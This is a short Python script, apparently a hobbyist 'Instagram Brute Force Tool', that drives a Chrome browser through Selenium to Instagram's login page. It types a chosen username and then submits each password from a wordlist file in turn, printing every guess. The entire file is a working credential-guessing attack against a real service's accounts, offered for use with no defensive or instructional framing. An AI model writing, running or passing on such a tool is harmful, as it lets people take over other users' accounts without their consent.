from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep

name = """
_ _  _ ____ ___ ____ ____ ____ ____ _  _    ___  ____ _  _ ___ ____ ____ ____ ____ ____ ____ 
| |\ | [__   |  |__| | __ |__/ |__| |\/|    |__] |__/ |  |  |  |___ |___ |  | |__/ |    |___ 
| | \| ___]  |  |  | |__] |  \ |  | |  |    |__] |  \ |__|  |  |___ |    |__| |  \ |___ |___ 
                                                                                             
                                    ___ ____ ____ _                                          
                                     |  |  | |  | |                                          
                                     |  |__| |__| |___                                       
                                                                                             
                                                                                             
                                                                                             
                                                                                             
                                                                                             
___  _   _    _  _ _  _ ____ _  _ _  _ _  _                                                  
|__]  \_/     |_/   \/  |__/ |  | |\ | |\ |                                                  
|__]   |      | \_ _/\_ |  \ |__| | \| | \|                                                  
                                                                                             
"""

class Instagram:
    def __init__(self, name, password, chrome_path):
        self.url = "https://www.instagram.com/"
        self.name = name
        self.password_path = password
        self.chrome_path = chrome_path
        self.browser = webdriver.Chrome(executable_path=self.chrome_path)

    def Login(self):
        try:
            self.browser.get(self.url)
            sleep(1)

            self.nameBlock = self.browser.find_element_by_name("username")
            self.passBlock = self.browser.find_element_by_name("password")
            self.loginButton = self.browser.find_element_by_xpath("//*[@id='loginForm']/div[1]/div[3]/button")

            self.nameBlock.send_keys(Keys.CONTROL + "a")
            self.nameBlock.send_keys(Keys.DELETE)
            self.nameBlock.send_keys(self.name)

            for password in open(self.password_path, "r"):
                self.passBlock.send_keys(Keys.CONTROL + "a")
                self.passBlock.send_keys(Keys.DELETE)

                if len(password) >= 7:
                    self.passBlock.send_keys(password)
                    print("Trying Password; ", password)
                    sleep(3)
                    self.browser.execute_script("arguments[0].click();", self.loginButton)
                else:
                    print("This password is too short!\nPassword:", password)

        except FileNotFoundError:
            print("'passwords.txt' file can not found please check and try again.")

        except Exception as e:
            print(e)


if __name__ == "__main__":
    print(name)
    name = str(input("Profil Name; "))
    passwords_path = str(input("'passwords.txt' Path; ")).replace("\\", "/")
    driver_path = str(input("'driver_path' Path; ")).replace("\\", "/")
    ins = Instagram(name, passwords_path, driver_path)
    ins.Login()